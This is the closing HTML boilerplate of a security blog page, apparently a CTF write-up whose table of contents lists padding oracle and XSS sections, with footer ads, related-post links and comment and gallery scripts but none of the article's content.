href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br></div></footer></article><aside class=related-contents--wrapper><h2 class=section-title>Related contents</h2><div class=related-contents><div class="flex article-list--tile"><article><a href=/2022/02/21/2022-02-21-PracticalTimingTimeless/><div class=article-details><h2 class=article-title>Writeup for A More Secure Pastebin - Practical Timeless Timing in Browser</h2></div></a></article><article><a href=/2022/01/08/2022-01-08-TheEndOfLFI/><div class=article-details><h2 class=article-title>hxp CTF 2021 - The End Of LFI?</h2></div></a></article><article><a href=/2021/12/27/2021-12-20-ANewNovelLFI/><div class=article-details><h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2></div></a></article><article><a href=/2021/07/21/google-qual-2021/><div class=article-details><h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2></div></a></article><article><a href=/2021/05/19/tls-ctf/><div class=article-details><h2 class=article-title>TLS-Poison 攻击方式在 CTF 中的利用实践</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//ZeddYu.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{DISQUS&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2018 -
2023 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#tldr>TL;DR</a></li><li><a href=#reconnaissance>Reconnaissance</a></li><li><a href=#padding-oracle-attack>Padding Oracle Attack</a></li><li><a href=#recovering-the-entire-plaintext>Recovering the Entire Plaintext</a></li><li><a href=#arbitrary-plaintext-encryption>Arbitrary Plaintext Encryption</a></li><li><a href=#the-xss-part>The XSS Part</a></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("/sw.js")})</script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>